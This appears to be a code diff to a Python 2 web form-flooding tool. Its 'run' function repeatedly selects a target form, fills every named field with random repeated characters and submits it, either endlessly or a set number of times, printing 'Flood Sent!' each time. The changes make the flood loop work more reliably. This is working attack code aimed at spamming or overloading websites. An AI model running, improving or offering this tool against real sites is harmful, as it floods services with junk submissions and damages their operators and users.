@@ -32,22 +32,27 @@ def run (command_args):
 	
 
     	if int (command_args [3]) <= 0:
-	 	try:
+		try:
 			while True:
+				b.select_form (nr=int (command_args [2]))
 	    	    		for i in b.controls:
-		    			b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
+		    			if i.name != None:
+					     b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
+                                             #print i
 	            		b.submit ()
 				print YES + 'Flood Sent!'
 		except Exception as e:
-			print NO + 'Sending Error!'
-			print e
+                        print NO + 'Sending Error!'
+                        print e
+
     	else:
 		try:
 			for i in range (time+1):
+				b.select_form (nr=int (command_args [2]))
 	    	    		for i in b.controls:
-		    		    b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
+		    		    if i.name != None: b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
 	    	    		b.submit ()
 				print YES + 'Flood Sent!'
 		except Exception as e:
 			print NO + 'Sending Error!'
-			print e
+#			print e
